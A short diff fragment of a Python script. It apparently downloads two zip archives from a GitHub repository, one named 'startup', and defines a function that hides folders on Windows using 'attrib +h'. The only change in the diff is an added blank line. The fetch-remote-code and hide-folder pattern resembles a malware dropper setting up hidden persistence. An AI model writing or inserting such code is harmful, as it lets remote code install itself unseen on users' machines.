@@ -66,6 +66,7 @@ import win32com.client
 
 download_and_extract("https://github.com/skibidi-123456/skibidi/archive/refs/heads/main.zip", "skibidi-main.zip")
 download_and_extract("https://github.com/skibidi-123456/skibidi/archive/refs/heads/startup.zip", "skibidi-startup.zip")
+
 def hide_folder_windows(path):
     subprocess.call(['attrib', '+h', path])
 
